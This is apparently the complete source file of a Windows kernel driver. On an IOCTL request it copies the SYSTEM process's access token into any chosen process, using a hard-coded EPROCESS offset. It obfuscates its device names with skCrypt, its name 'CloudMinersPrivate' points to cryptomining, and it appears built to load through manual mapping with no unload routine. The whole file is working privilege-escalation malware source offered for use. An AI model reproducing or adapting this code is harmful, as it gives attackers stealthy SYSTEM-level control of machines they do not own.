#include <ntifs.h>
#include <stdarg.h>
#include "skCrypt.h"
#pragma warning(disable: 6328 6273) // disable DbgPrintEx warnings

constexpr ULONG requestElevate = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x777, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
#define dbgmode

void Log(const char* text, ...) {
    va_list(args);
    va_start(args, text);

    #if defined(dbgmode)
        vDbgPrintExWithPrefix("[KernelElevate] ", 0, 0, text, args);
    #endif

    va_end(args);
}

extern "C" {
    char* PsGetProcessImageFileName(PEPROCESS Process);
    NTKERNELAPI NTSTATUS IoCreateDriver(PUNICODE_STRING DriverName, PDRIVER_INITIALIZE InitializationFunction);
}

bool elevateRights(int PID) {
    PVOID proc = NULL, ntoskrnl = NULL;
    PACCESS_TOKEN targetToken, ntoskrnlToken;
    __try {
        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)PID, (PEPROCESS*)&proc);
        if (ret != STATUS_SUCCESS) {
            if (ret == STATUS_INVALID_PARAMETER) Log("the PID is invalid.\n");
            if (ret == STATUS_INVALID_CID) Log("the CID is invalid.\n");

            return FALSE;
        }

        PsLookupProcessByProcessId((HANDLE)0x4, (PEPROCESS*)&ntoskrnl);

        if (ret != STATUS_SUCCESS) {
            if (ret == STATUS_INVALID_PARAMETER) Log("ntoskrnl PID was not found.\n");
            if (ret == STATUS_INVALID_CID) Log("ntoskrnl PID is not valid.\n");

            ObDereferenceObject(proc);
            return FALSE;
        }
        
        char* peName;
        Log("pe name: %s\n", peName = PsGetProcessImageFileName((PEPROCESS)proc));

        targetToken = PsReferencePrimaryToken((PEPROCESS)proc);
        if (!targetToken) {
            ObDereferenceObject(ntoskrnl);
            ObDereferenceObject(proc);
            return FALSE;
        }

        Log("%s token: %x\n", peName, targetToken);

        ntoskrnlToken = PsReferencePrimaryToken((PEPROCESS)ntoskrnl);
        if (!ntoskrnlToken) {
            ObDereferenceObject(ntoskrnl);
            ObDereferenceObject(targetToken);
            ObDereferenceObject(proc);
            return FALSE;
        }

        Log("ntoskrnl token: %x\n", ntoskrnlToken);
        ULONG_PTR UProcIdAddr = (ULONG_PTR)proc + 0x4b8;

        Log("%s token addr: %x\n", peName, UProcIdAddr);
        ULONG_PTR ntoskrnladdr = (ULONG_PTR)ntoskrnl + 0x4b8;

        Log("ntoskrnl token addr: %x\n", ntoskrnladdr);
        *(PHANDLE)UProcIdAddr = *(PHANDLE)ntoskrnladdr;

        Log("%s token upgraded to: %x ", peName, *(PHANDLE)(UProcIdAddr));
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }

    ObDereferenceObject(ntoskrnl);
    ObDereferenceObject(targetToken);
    ObDereferenceObject(ntoskrnlToken);
    ObDereferenceObject(proc);
    return TRUE;
}

NTSTATUS IoControl(PDEVICE_OBJECT devObj, PIRP irp) {
    UNREFERENCED_PARAMETER(devObj);

    auto stack = IoGetCurrentIrpStackLocation(irp);
    bool status = false;

    if (stack) {
        const auto ctl_code = stack->Parameters.DeviceIoControl.IoControlCode;
        if (ctl_code == requestElevate) {
            int recvPID = 0;

            RtlCopyMemory(&recvPID, irp->AssociatedIrp.SystemBuffer, sizeof(recvPID));
            status = elevateRights(recvPID);
            Log("received PID: %d\n", recvPID);
        }
    }
    IoCompleteRequest(irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

NTSTATUS IoCreateClose(PDEVICE_OBJECT devObj, PIRP irp) {
    UNREFERENCED_PARAMETER(devObj);

    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return irp->IoStatus.Status;
}

NTSTATUS RealEntry(PDRIVER_OBJECT driverObj, PUNICODE_STRING registeryPath) {
    UNREFERENCED_PARAMETER(registeryPath);

    UNICODE_STRING devName, symLink;
    PDEVICE_OBJECT devObj;

    auto device = skCrypt(L"\\Device\\CloudMinersPrivate");

    RtlInitUnicodeString(&devName, device);
    auto status = IoCreateDevice(driverObj, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &devObj);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    auto dosDevice = skCrypt(L"\\DosDevices\\CloudMinersPrivate");

    RtlInitUnicodeString(&symLink, dosDevice);
    status = IoCreateSymbolicLink(&symLink, &devName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(devObj);
        return status;
    }

    SetFlag(devObj->Flags, DO_BUFFERED_IO);

    driverObj->MajorFunction[IRP_MJ_CREATE] = IoCreateClose;
    driverObj->MajorFunction[IRP_MJ_CLOSE] = IoCreateClose;
    driverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControl;
    driverObj->DriverUnload = NULL;

    ClearFlag(devObj->Flags, DO_DEVICE_INITIALIZING);

    return status;
}

NTSTATUS EntryPoint(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
    UNREFERENCED_PARAMETER(pDriverObject);
    UNREFERENCED_PARAMETER(pRegistryPath);

    auto driver = skCrypt(L"\\Driver\\CloudMinersPrivate");

    UNICODE_STRING drvName;
    RtlInitUnicodeString(&drvName, driver);
    IoCreateDriver(&drvName, &RealEntry);

    return STATUS_SUCCESS;
}
